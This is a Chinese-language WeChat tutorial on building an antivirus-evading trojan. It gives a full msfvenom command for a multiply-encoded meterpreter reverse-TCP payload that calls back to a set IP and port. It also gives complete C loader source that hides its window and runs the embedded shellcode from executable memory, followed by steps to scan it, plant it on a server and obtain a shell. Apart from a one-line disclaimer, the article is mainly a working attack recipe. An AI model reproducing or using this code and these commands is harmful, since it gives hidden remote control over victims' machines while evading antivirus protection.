> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dVYgFxSbn0QZRe-fDpDp6Q)

知道为什么梦里的人都看不清脸么？因为怕你当真。。。

----  网易云热评

 ![](http://wx.qlogo.cn/finderhead/PiajxSqBRaEJ7Ik2tcpu1fLbiceIMq8ALz06e9g1ENj06MEeFBG1snVQ/0) **之乎者也吧** #2021Kali 系列 #免杀 @微信时刻 @微信创作者 视频号

一、通过 MSF 生成 shellcode  

1、启动 MSF，演示版本是 6.0.36

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63kXvkrLNXMkicbia92Ld1dXFgVSz9y1YyaQB02tqasGs43aiapzqzIhhP3Q/640?wx_fmt=png)

2、通过 msfvenom 生成相关代码

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=192.168.139.133 lport=8585 -f c
```

-p：指定 payload

-e：指定选择使用的编码

-i：给 payload 编码的次数

-b：避免出现的字符

-f：输出文件类型

二、通过 VS2019 编译免杀木马

1、启动 VS2019 新建控制台应用程序

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63kOjnDxwfzviaoibxgerorvUwDHLj6bugunNcuaftVJkY3gxofAmm33yfw/640?wx_fmt=png)

2、一路下一步，最后将主函数代码替换成下面的代码

```
#include<stdio.h>
#include<windows.h>
#include <time.h>
int main(int argc, char const* argv[])
{
       ShowWindow(GetConsoleWindow(), SW_HIDE);
       unsigned char buf[] =  "\xbf\xc2\xd4\x1d\x34\xd9\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\xa3\x31\x78\x15\x03\x78\x15\x83\xe8\xfc\xe2\x37\x6a\x4e\xf4"
"\xfe\x20\xa8\x3f\xd9\x33\x6f\x34\x86\x88\xa6\x05\xa5\xde\x4f"
"\x74\x56\xcf\x4c\x7b\x7c\xde\x06\x3a\x6f\xdf\xaa\x1e\x08\xb5"
"\x15\x96\x18\x69\x5c\x22\x14\x76\x4d\x5a\x55\x46\x84\x4c\xf6"
"\x5c\xbe\x11\x6f\xce\x02\xa7\xd4\xc0\xc5\xcc\xb8\x72\x3c\xe3"
"\x45\x50\x2a\x3a\x10\x64\x23\xb4\x8a\xae\x53\x8f\x59\xe4\xec"
"\xed\x4d\x59\x44\x4a\x1b\x64\x03\x94\xfd\x7b\xb2\x45\x76\x80"
"\x1d\x95\x02\x81\x32\xed\x5f\x14\x10\x1c\x08\x1f\x3c\xb3\x4b"
"\x79\xfe\x0c\xa1\x52\xea\x56\xcb\xae\x44\x09\x9a\x7b\xc2\x30"
"\x25\x7e\x8e\x31\x88\xcc\xf8\x8c\x71\xe5\xde\x79\xbc\x77\x40"
"\x82\x97\xea\x9a\x36\xe6\xc4\xab\xd7\xc0\xb2\xc6\xa7\x79\xa0"
"\x9c\x9a\x07\x70\x9b\xe6\x81\x53\x6d\xe5\x4c\xe7\x46\x28\xdb"
"\x61\x0f\x51\x8e\xca\xcb\x40\xdf\x68\xf7\x73\x2d\xe4\xf0\xea"
"\xe1\x83\x95\x97\x91\xd2\x46\x51\x8c\xcb\x15\x2a\xb2\xc0\xe6"
"\x78\x9d\xfd\x3e\x2c\xeb\x6c\xbc\x40\x05\x5b\x2b\x16\x48\x1b"
"\x01\x09\x38\xdf\xd8\xec\x23\x94\x60\x76\x73\x48\x48\xe9\xe1"
"\xf4\x5e\x8d\xbf\x95\x46\xae\x66\xc8\x37\x0d\x43\x02\xbd\x4d"
"\x66\x82\x9d\xf9\x46\xc1\x03\x22\x73\x14\xcd\x0a\x12\x83\xf9"
"\x54\x04\x7e\x6d\x71\xd7\x8c\x0c\x99\x81\x88\x2d\x62\xcd\xf0"
"\x6e\x3c\x1c\xa8\x07\xa0\x9d\x43\x5e\xb3\x6b\x2f\x9f\xc3\x66"
"\x3f\xad\xc3\x99\xde\x83\x22\x7e\x84\x85\x4a\x9c\x41\x85\xb6"
"\xbd\x04\x39\x7d\xde\x4f\x8d\x86\xfc\x95\xb9\x22\xf1\x63\xfb"
"\x6c\x59\x2e\x7c\x95\xdf\x1f\x45\x88\x2a\x2f\x7a\x9c\xf1\x75"
"\xff\x90\x6e\x90\x20\x1e\x6f\x4e\x52\x7d\x1d\xab\x47\x15\x94"
"\x7e\xf0\x7c\x56\x21\xb4\xdd\xf0\x0b\xdc\x22\x43\x91\x08\x21"
"\x89\x63\xdc\x54\xc3\xc4\x10\x9d\x9c\xdc\x76\xae\xb4\xf3\x33"
"\xbd\x57\xb0\xf2\xf9\xbf\xfb\xae\x0d\x8e\x33\x5f\xc4\xdf\xa1"
"\x74\xd3\xe8\xdf\xbf\xfd\xff\x3c\x1b\x63\x60\x06\x32\xba\x42"
"\x2c\xd5\x13\xd5\x2a\x93\x5a\x77\xc4\xf0\x70\xb1\x6e\x41\xd0"
"\x55\x02\xd2\x57\x5e\xf9\x08\x65\xbc\xff\x19\xf7\x45\x9f\x6d"
"\x6a\x17\x7f\xb1\xae\x8e\xb9\x26\xe0\x28\x0e\xe2\x53\x1a\x0d"
"\xf8\xc7\xea\xa7\x3e\x5a\xbd\xc9\x30\xf3\x7e\x58\xbc\xe9\x68"
"\x4d\xb3\x78\xce\x69\x45\x53\x85\xc0\xba\x2a\x9f\x01\xe9\xba"
"\x43\xee\x8b\x20\x0b\x86\x48\x28\x2c\x72\x64\xfc\x84\x7d\xd6"
"\xa2\xe5\x73\x56\x7b\x61\xbf\xb8\x30\x23\xb7\x90\x66\x4e\xf6"
"\xdf\xde\xd4\xd9\x12\xb6\x97\x39\x3e\xed\x1f\xdc\x04\x7e\x81"
"\x41\x48\xd1\x91\x20\x02\x69\xff\x33\xdb\x87\x7a\xf0\x9c\xa5"
"\xb2\x3a\x2e\x6b\x4e\xd0\xe1\x76\x24\xbc\xf5\xc8\x26\xf1\x94"
"\x89\x1d\x2f\xc0\x80\x01\x07\x49\xef\xb2\xb0\x79\x6f\x90\x5a"
"\x66\x44\xd5\x48\x13\x19\x6e\xa7\xf0\x34\x3f\x93\xe2\x32\x83"
"\x84\xfe\x3a\x26\x6d\x59\x6b\xe5\x9c\x78\x72\x97\x01\xeb\x90"
"\x2f\x92\x2f\x83\x96\x52\x93\x5f\xd4\x89\xab\x32\xf9\x29\x2f"
"\xa6\xe2\x1c\x94\xf0\xdc\xa9\x5c\x88\x78\xde\xca\x7f\x3a\xbf"
"\xac\xc1\xf3\x7f\x38\xba\xf7\xd0\xd5\x1e\x8e\xa7\xfc\x99\xec"
"\x12\x83\xc2";
       void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);
       memcpy(exec, buf, sizeof buf);
       ((void(*)())exec)();
       
       return 0;
}
```

3、生成解决方案  

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63kDM01oPtFQEB2yentWRkJ4LxRCabdWiap5ooARG57wrvt9WLiaCk9aQUg/640?wx_fmt=png)

4、右击生成的木马，使用 36X 扫描

三、实战操作

1、上传生成的木马到服务器，假设就是本地服务器

2、打开 msf，选择合适的攻击模块，run 运行

3、在服务器运行免杀木马，成功获取 shell

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63kpct81ickfoLxKcPbMfcD3zW86k4H0b7ibPnTChpbtg8eOc1xLKXB7t8A/640?wx_fmt=png)

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

欢迎关注视频号：之乎者也吧

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63k1NlPNoia5EbpVxlurFQXjA2Y93WYYLI8Q6wcKaPwlPqZK2qh64K79Fw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63kic6PwKrhz1BO4m58dYNpnmZic0Wy45l8eMHG4ed1Yibl6GDLJPk833M6w/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibvvtmWJD5PKUmtYzjb0Y63k6ZtjwQib2BVn9eLC5y2qL56Of1W3licMpWYDr3EyVgPFzm0vv2A4awAA/640?wx_fmt=jpeg)